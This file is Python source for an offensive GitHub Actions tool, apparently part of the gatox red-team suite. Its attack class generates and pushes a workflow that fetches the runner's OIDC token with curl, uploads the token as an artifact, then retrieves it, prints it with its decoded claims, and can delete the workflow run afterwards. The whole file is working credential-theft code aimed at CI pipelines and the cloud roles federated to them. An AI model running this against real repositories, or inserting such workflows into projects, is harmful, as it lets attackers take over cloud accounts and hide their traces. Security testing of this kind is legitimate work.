"""
Copyright 2025, Adnan Khan

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
"""

import asyncio
import json
import random
import re
import string
from base64 import b64decode

import yaml

from gatox.attack.attack import Attacker
from gatox.cli.output import Output

_INVALID_ARTIFACT_CHARS = re.compile(r'[":<>|*?\\/\r\n]')


def _sanitize_artifact_suffix(value: str) -> str:
    """Replace characters disallowed in GitHub artifact names with '_'."""
    return _INVALID_ARTIFACT_CHARS.sub("_", value)


class OIDCAttack(Attacker):
    """Attack class to demonstrate OIDC token exchange via GitHub Actions."""

    @staticmethod
    def create_oidc_exfil_yaml(
        branch_name: str,
        audience: str,
        environments: list[str] | None = None,
        runner: list[str] | None = None,
    ):
        """Create a workflow YAML that requests an OIDC token and uploads it as an artifact.

        Args:
            branch_name (str): Branch name for the on: push trigger.
            audience (str): OIDC audience value for the token request.
            environments (list[str] | None): Optional list of environments to
                target via a job matrix.
        """
        yaml_file = {}
        yaml_file["name"] = branch_name
        yaml_file["on"] = {"push": {"branches": branch_name}}
        yaml_file["permissions"] = {"id-token": "write", "contents": "read"}

        artifact_name = "files-${{ matrix.safe_name }}" if environments else "files"

        test_job = {
            "runs-on": runner or ["ubuntu-latest"],
            "steps": [
                {
                    "name": "Get OIDC Token",
                    "run": (
                        f'OIDC_TOKEN=$(curl -sH "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN"'
                        f' "$ACTIONS_ID_TOKEN_REQUEST_URL&audience={audience}" | jq -r .value)\n'
                        'echo "$OIDC_TOKEN" > oidc_token.txt\n'
                    ),
                },
                {
                    "name": "Upload artifacts",
                    "uses": "actions/upload-artifact@v4",
                    "with": {
                        "name": artifact_name,
                        "path": "oidc_token.txt",
                    },
                },
            ],
        }

        if environments:
            matrix_include = [
                {"environment": env, "safe_name": _sanitize_artifact_suffix(env)}
                for env in environments
            ]
            test_job["strategy"] = {"matrix": {"include": matrix_include}}
            test_job["environment"] = {
                "name": "${{ matrix.environment }}",
                "deployment": False,
            }

        yaml_file["jobs"] = {"testing": test_job}

        class _OIDCDumper(yaml.Dumper):
            pass

        _OIDCDumper.add_representer(
            bool,
            lambda dumper, data: dumper.represent_scalar(
                "tag:yaml.org,2002:str", "true" if data else "false", style=""
            ),
        )

        return yaml.dump(yaml_file, sort_keys=False, Dumper=_OIDCDumper)

    @staticmethod
    def _decode_jwt_claims(token: str):
        """Decode JWT payload claims without verification."""
        parts = token.split(".")
        if len(parts) != 3:
            return None
        payload = parts[1]
        payload += "=" * (4 - len(payload) % 4)
        payload = payload.replace("-", "+").replace("_", "/")
        return json.loads(b64decode(payload))

    async def oidc_exfil(
        self,
        target_repo: str,
        target_branch: str | None,
        commit_message: str | None,
        delete_action: bool,
        yaml_name: str,
        audience: str,
        finegrain_scopes: set | None = None,
        environments: list[str] | None = None,
        runner: list[str] | None = None,
    ):
        """Demonstrate OIDC token exchange by extracting a GitHub Actions OIDC token.

        Args:
            target_repo (str): Repository to target.
            target_branch (str | None): Branch to create workflow in.
            commit_message (str | None): Commit message for the attack workflow.
            delete_action (bool): Whether to delete the workflow run after execution.
            yaml_name (str): Name of the yaml file to use.
            audience (str): OIDC audience for the token request.
            finegrain_scopes (set | None): Fine-grained PAT scopes if applicable.
            environments (list[str] | None): Environments to target via job matrix.
            runner (list[str] | None): Runner labels. Defaults to ubuntu-latest.
        """
        if finegrain_scopes is None:
            finegrain_scopes = set()
        await self.setup_user_info()

        if not self.user_perms:
            return False

        if (
            "repo" in self.user_perms["scopes"]
            and "workflow" in self.user_perms["scopes"]
        ) or (
            "workflows:write" in finegrain_scopes
            and "contents:write" in finegrain_scopes
        ):
            if target_branch:
                branch = target_branch
            else:
                branch = "".join(random.choices(string.ascii_lowercase, k=10))

            res = await self.api.get_repo_branch(target_repo, branch)
            if res == -1:
                Output.error("Failed to check for remote branch!")
                return
            elif res == 1:
                Output.error(f"Remote branch, {branch}, already exists!")
                return

            Output.info(
                f"Requesting OIDC token with audience: {Output.bright(audience)}"
            )
            yaml_contents = self.create_oidc_exfil_yaml(
                branch, audience, environments, runner
            )
            workflow_id = await self.execute_and_wait_workflow(
                target_repo, branch, yaml_contents, commit_message, yaml_name
            )
            if not workflow_id:
                return

            if environments:
                artifact_to_env = {
                    f"files-{_sanitize_artifact_suffix(env)}": env
                    for env in environments
                }
                expected = set(artifact_to_env.keys())
                all_artifacts = {}
                for _ in range(30):
                    all_artifacts = await self.api.retrieve_all_workflow_artifacts(
                        target_repo, workflow_id
                    )
                    if expected.issubset(all_artifacts.keys()):
                        break
                    await asyncio.sleep(1)

                missing = expected - all_artifacts.keys()
                if missing:
                    Output.error(
                        "Artifacts missing for environment(s): "
                        f"{', '.join(artifact_to_env[m] for m in missing)}"
                    )

                self.__present_tokens_from_artifacts(
                    all_artifacts, expected - missing, artifact_to_env
                )
            else:
                artifact = None
                for _ in range(30):
                    artifact = await self.api.retrieve_workflow_artifact(
                        target_repo, workflow_id
                    )
                    if artifact and "oidc_token.txt" in artifact:
                        break
                    await asyncio.sleep(1)

                if not artifact or "oidc_token.txt" not in artifact:
                    Output.error(
                        "Failed to retrieve OIDC token artifact! "
                        "The workflow may lack 'id-token: write' permission or the "
                        "repository may not support OIDC."
                    )
                else:
                    self.__present_tokens_from_artifacts(
                        {"files": artifact}, {"files"}, {}
                    )

            if delete_action and (
                not finegrain_scopes or "actions:write" in finegrain_scopes
            ):
                res = await self.api.delete_workflow_run(target_repo, workflow_id)
                if not res:
                    Output.error("Failed to delete workflow!")
                else:
                    Output.result("Workflow deleted successfully!")
        else:
            Output.error(
                "The user does not have the necessary scopes to conduct this attack!"
            )

    def __present_tokens_from_artifacts(
        self, artifacts: dict, names: set, artifact_to_env: dict
    ):
        """Print de-duplicated OIDC tokens from the given artifacts.

        Args:
            artifacts (dict): {artifact_name: {filename: bytes}}
            names (set): Artifact names to process.
            artifact_to_env (dict): Map from sanitized artifact name to the
                original environment label for display.
        """
        seen_tokens: set[str] = set()

        for name in names:
            files = artifacts.get(name, {})
            if "oidc_token.txt" not in files:
                continue
            token = files["oidc_token.txt"].decode().strip()
            if token in seen_tokens:
                continue
            seen_tokens.add(token)

            env_label = artifact_to_env.get(name) if name != "files" else None
            header = (
                f"OIDC Token [{Output.bright(env_label)}] Retrieved:"
                if env_label
                else "OIDC Token Retrieved:"
            )
            Output.owned(header)
            print(token)

            try:
                claims = self._decode_jwt_claims(token)
                if claims:
                    Output.result("Token Claims:")
                    for k, v in claims.items():
                        print(f"  {k}: {v}")
            except Exception:
                pass
